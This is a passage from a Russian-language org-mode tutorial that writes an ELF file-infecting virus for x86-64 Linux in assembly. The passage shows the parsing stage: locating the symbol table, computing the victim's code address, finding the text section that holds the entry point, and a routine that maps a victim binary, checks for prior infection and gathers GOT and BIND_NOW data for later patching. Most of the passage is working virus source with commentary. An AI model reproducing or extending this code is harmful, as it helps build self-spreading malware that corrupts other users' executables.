      pop     %rdi
      pop     %rdx
      pop     %rcx
      ret

#+END_SRC

Теперь ищем таблицу символов. Она хранит в себе информацию о всех
символах программы: каждая запись - это имя символа и адрес, по которому
он объявлен.

К счастью, эта секция имеет специфический тип - ее заголовок будет иметь
тип №2. Так что можно просто пройтись по таблице секций и найти ее
заголовок. Если нашли, то сохраняем адрес ее заголовка и высчитываем
количество записей в ней.

~symtab~ приходится искать, потому что в будущем мы подвергнем ее
редактированию: если не отредактировать адреса в ней, то загрузчик/линкер может
работать некорректно.

#+NAME: _find_symtab
#+BEGIN_SRC asm
  /// FIND_SYMTAB_CODE
  /// Ищет среди всех заголовков секций заголовк symtab - этот заголовок описывает
  /// таблицу символов. Ищем по типу заголовка -
  /// у symtab этот тип 2, symtab может быть
  /// в файле в единственном числе
  /// PARAMS:
  /// RDI - указатель нa таблицу заголвоков секций
  /// RSI - количество заголовков
  _find_symtab:
      push    %rcx
      push    %rdx
      push    %rdi
      push    %rsi

      mov     victim_shdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je      _find_symtab_fail

      mov     victim_shdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _find_symtab_fail

  _find_symtab_cycle:
      mov     %rdi, %rsi
      mov     SHDR_SH_TYPE(%rdi), %rdx

      cmp     $0x2, %rdx   # shdr = symtab?
      je      _find_symtab_success

      add     $0x40, %rsi
      mov     %rsi, %rdi
      loop    _find_symtab_cycle

  _find_symtab_success:
      leaq    symtab_shdr_addr(%rip), %rdi
      mov     %rsi,  (%rdi)

      // считаем кол-во записией в symtab
      // symtab size / symtab record size = rec. amount
      mov      SHDR_SH_SIZE(%rsi), %rdx
      mov      $0x18, %ecx
      movl     %edx, %eax
      xor      %rdx, %rdx
      idivl    %ecx

      leaq    symtab_records_amount(%rip), %rdi
      mov     %rax, (%rdi)

      xor     %rax, %rax
      jmp     _find_symtab_exit

  _find_symtab_fail:
      mov     $-1, %rax

  _find_symtab_exit:
      pop     %rsi
      pop     %rdi
      pop     %rdx
      pop     %rcx
      ret

#+END_SRC

Так же нам хорошо бы знать ~виртуальный~ адрес кода жертвы - т.е. кода,
который начинается сразу после таблицы заголовков сегментов.

Зачем?
Дело в том, что секция ~dynamic~ содержит в себе разные записи: некоторые
выглядят как "имя секции - адрес секции", а другие как "имя секции -
размер записи в секции". При редактировании мы хотим как-то отличать
адреса от размеров, а сделать это не никакой возможности: и то, и то -
цифры, а ставить кучу условий вроде "если тип записи такой-то, то не
редактировать запись" очень накладно: если секция ~dynamic~ чуть
изменится, то функцию по редактированию придется переписывать.

И вот именно поэтому нам нужен виртуальный адрес кода жертвы. Мы не будем
редактировать значения меньше него, считая их размером, а не адресом,
поскольку ~dynamic~ не описывает таблицу заголовков сегментов или
заголовк эльфа - а до кода жертвы находятся только они.

#+NAME: _count_victim_code_begin_vaddr
#+BEGIN_SRC asm
  /// _COUNT_VICTIM_CODE_BEGIN_VADDR
  /// считает виртуальный адрес кода жертвы
  _count_victim_code_begin_vaddr:
      push    %rdx
      push    %rdi
      push    %rsi

      mov    victim_code_offset(%rip), %rdx
      test    %rdx, %rdx
      je     _count_victim_code_begin_vaddr_fail

      mov    first_seg_vaddr(%rip), %rdi
      // test   %rdi, %rdi
      // je     _count_victim_code_begin_vaddr_fail

      add    %rdx, %rdi

      leaq   victim_code_frm_begin_vaddr(%rip), %rsi
      mov    %rdi, (%rsi)
      xor    %rax, %rax
      jmp     _count_victim_code_begin_vaddr_exit

  _count_victim_code_begin_vaddr_fail:
      mov     $-1, %rax

  _count_victim_code_begin_vaddr_exit:
      pop    %rsi
      pop    %rdi
      pop    %rdx
      ret
#+END_SRC

Ну и фишенка на торте парсинга - это поиск заголовка первой же секции
~text~ жертвы.
Нам он нужен только для того, чтоб вытащить значение его поля ~sh_name~ -
это поле содержит в себе индекс, который указывает на строку в таблице
строк ~strtab~, именно благодаря этому можно увидеть названия секций в
выводе ~readelf~. Нам нужен этот индекс при генерации заголовка секци
вируса - так мы можем сослаться на уде существующее имя, а не вписывать
дополнительную строку в таблицу строк.

Обычно в первой секции ~text~ находится точка входа. Так что нам нужена
секция, чей виртуальный адрес будет <= адреса entry point, и виртуальный
адрес конца будет >= entry_point.

#+NAME: _find_symtab
#+BEGIN_SRC asm
  /// _FIND_VICTIM_TEXT_SECTION
  /// находит секцию text для заражения -
  /// этот сегмент содержит e_entry
  // Как понять, что сегмент содержит e_entry:
  // его sh_addr <= e_entry,
  // его sh_addr + sh_size > e_entry
  /// Этот заголовко секции  нужен, чтоб прочитать его sh_name -
  /// индекс в таблице строк, его же присвоим новому заголовку
  /// секции вируса

      .globl  _find_victim_text_section
      .type	_find_victim_text_section, @function
  _find_victim_text_section:
      push    %rbx
      push    %rcx
      push    %rdx
      push    %rdi
      push    %rsi

      // проверяем наличие необходимых для посика данных
      mov     victim_elf_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _find_victim_text_section_fail

      mov     ELF_E_ENTRY(%rdi), %rdx

      mov     victim_shdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _find_victim_text_section_fail

      mov     victim_shdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je      _find_victim_text_section_fail

  _find_victim_text_section_cycle:
      mov     %rdi, %rax
      mov     SHDR_SH_ADDR(%rdi), %rbx     # получаем поле sh_addr

      cmp     %rdx, %rbx  # addr долен быть <= e_entry
      jg      _next_iter_find_text

      mov    %rax, %rdi
      mov    SHDR_SH_SIZE(%rdi), %rsi # размер текущего секц.

      add    %rsi, %rbx   # адрес конца текущeго сегмент

      cmp    %rdx, %rbx   # cur sect. end > e_entry
      jl     _next_iter_find_text

      jmp    _find_text_success   # section is found
  _next_iter_find_text:

      add     $0x40, %rax
      mov     %rax, %rdi

      loop    _find_victim_text_section_cycle
      jmp     _find_victim_text_section_fail

  _find_text_success:
      leaq    sh_name_indx(%rip), %rcx
      movl    (%rax), %edx
      movl    %edx, (%rcx)  # save sect. sh_name
      xor     %rax, %rax
      jmp     _find_text_exit

  _find_victim_text_section_fail:
      mov     $-1, %rax

  _find_text_exit:
      pop     %rsi
      pop     %rdi
      pop     %rdx
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC

 Технически, можно было бы в начале находить первую секцию ~text~, а
 затем проверять, инфицирован ли файл - не пришлось бы проходить циклом
 по всем секциями типа ~PROGBITS~. Но это будет действовать только в том
 случае, если управление всегда будет сначала передаваться на вирус, а
 потом на жертву, а не наоборот. Так что безопаснее проверить все
 секции.

 Ну и теперь можно собрать общий алгоритм парсинга.

 Он действует следующим образом:
- открыть и смапить файл в память, сохранить адрес
- проверить, эльф ли это
- получить информацию о заголовках секций жертвы
- проверить, инфицирован ли файл
- получить  заголовках сегментов жертвы
- найти виртуальный адрес первого загружаемого сегмента кода
- найти виртуальный адрес и выравнивание последнего сегмента кода
- найти секцию dynamic
- если секция dynamic есть, то проверить наличие в ней записи ~BIND_NOW~,
найти записть о ~GOT~, получить о ней информацию, высчитать адрес ~GOT~ в
смапенном файле. Противном случае сразу отправиться считать адрес и
размер кода жертвы
- посчитать адрес и размер кода жертвы (способ отличается, в зависимостри
  от того, вставляем мы ~BIND_NOW~ или нет, см. выше)
- найти текстовую секцию жертвы и сохранить ее индекс в таблице строк
- найти таблицу символов
- высчитать виртуальный адрес начала кода жертвы

Большинство этапов критично важны - поэтому после почти каждого
проверяется значения в ~rax~. Если оно отрицательное, то в большинстве
случаев это означает файл парсинга. Тогда придется парсить жертву.
В ином случае отрицательное значение показывает, что способ, которым мы
получаем информацию, не подходит для данного кейса - например, мы
пытаемся посчитать адрес и размер кода жертвы так, как будто ~BIND_NOW~
не вставляется, хотя это не так. Тогда мы пробуем иной сопособ (если
есть) и если уж не сработал и он, тогда это является фэйлом парсинга.
#+NAME: _parse_victim
#+BEGIN_SRC asm
  /// _PARSE_VICTIM
  /// Вызывает парсинг жертвы
  /// В случае провала возвращ -1
  _parse_victim:
      call    _get_victim_addr
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _is_it_elf
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _get_shdrs_info
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _check_file_infection
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _get_phdrs_info
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _find_first_seg_vaddr
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _find_last_seg_vaddr
      test    %rax, %rax
      jne     _parse_victim_fail

      call     _find_dynamic
      test    %rax, %rax
      jne      _get_victim_code

  _check_bind_now:
      call    _find_bind_now_record
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _find_got_section_vaddr
      test    %rax, %rax
      jne     _get_victim_code

      call    _find_got_section_im_memory

  _get_victim_code:
      call    _get_victim_whole_code_addr_and_size
      test    %rax, %rax
      je      _find_first_text_section

      call    _get_victim_code_addr_and_size_with_bind_now
      test    %rax, %rax
      jne     _parse_victim_fail

  _find_first_text_section:
      call    _find_victim_text_section
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _find_symtab
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _count_victim_code_begin_vaddr
      test    %rax, %rax
      jne     _parse_victim_fail

  _parse_victim_success:
      movq    $0, parse_success(%rip)
      xor     %rax, %rax
      jmp     _parse_victim_exit

  _parse_victim_fail:
      mov   $-1, %rax

  _parse_victim_exit:
      ret

#+END_SRC
